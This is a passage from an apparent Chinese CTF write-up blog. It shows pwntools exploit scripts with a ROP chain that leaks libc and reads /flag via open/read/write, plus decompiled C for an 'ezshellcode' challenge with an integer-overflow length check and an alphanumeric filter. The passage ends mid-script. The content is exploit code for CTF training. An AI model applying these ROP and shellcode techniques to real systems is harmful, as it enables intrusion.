punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length             <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token number\">0x100</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>vuln <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'vuln'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x000000000040101a</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000004013e3</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>pad1 <span class=\"token operator\">=</span> padding<span class=\"token operator\">*</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x12345678</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>vuln<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>se<span class=\"token punctuation\">(</span>pad1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>puts <span class=\"token operator\">=</span> lic<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x7f'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'puts ===>'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\"># libc = LibcSearcher('puts',puts)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>libc_base <span class=\"token operator\">=</span> puts <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>read_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>open_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>write_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>rdx<span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x142c92</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>rsi <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x2601f</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>buf <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>bss<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>rax <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x36174</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>rsp <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x2f70a</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>syscall_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'syscall'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>pad2<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x108</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rsi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>read_addr<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rsp<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>buf<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>se<span class=\"token punctuation\">(</span>pad2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>pad3<span class=\"token operator\">=</span><span class=\"token string\">b'/flag'</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>pad3<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rsi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>open_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>pad3<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rsi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>buf<span class=\"token operator\">+</span><span class=\"token number\">0x300</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>read_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>pad3<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rsi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>buf<span class=\"token operator\">+</span><span class=\"token number\">0x300</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>write_addr<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>vuln<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>se<span class=\"token punctuation\">(</span>pad3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>rc<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote D0\\_yoU\\_F4ncy\\_7he\\_E1d3nR1ng?I\\_D0!\\=\"\">\n<p>flag\\</p>\n</blockquote>\n<h3 id=\"ezshellcode100pt\"><a class=\"markdownIt-Anchor\" href=\"#ezshellcode100pt\">#</a> ezshellcode(100pt)</h3>\n<blockquote>\n<p>Short visible shellcode？</p>\n</blockquote>\n<p>整型溢出并绕过判段之后进行可见字符的 shellcode</p>\n<p>程序代码</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __fastcall <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-14h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-10h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v6 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">init</span><span class=\"token punctuation\">(</span>argc<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">,</span> envp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token function\">mmap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0x20240000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1000uLL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">33</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v5 <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1LL</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mmap\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"input the length of your shellcode:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%2d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v4 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">10</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"input your shellcode:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">myread</span><span class=\"token punctuation\">(</span>v5<span class=\"token punctuation\">,</span> v4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"too long\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token function\">v5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 __fastcall <span class=\"token function\">myread</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> a2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  <span class=\"token keyword\">char</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+1Fh] [rbp-11h]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+20h] [rbp-10h]</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+24h] [rbp-Ch]</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+28h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  v6 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> a1<span class=\"token punctuation\">,</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> v5<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    v3 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>a1 <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">96</span> <span class=\"token operator\">||</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">122</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">64</span> <span class=\"token operator\">||</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">90</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">47</span> <span class=\"token operator\">||</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">57</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>      <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid character\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>      <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  <span class=\"token keyword\">return</span> v6 <span class=\"token operator\">-</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>exp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'47.100.137.175'</span><span class=\"token punctuation\">,</span><span class=\"token number\">32468</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># r = process('./pwn')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length             <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">'-1'</span><span 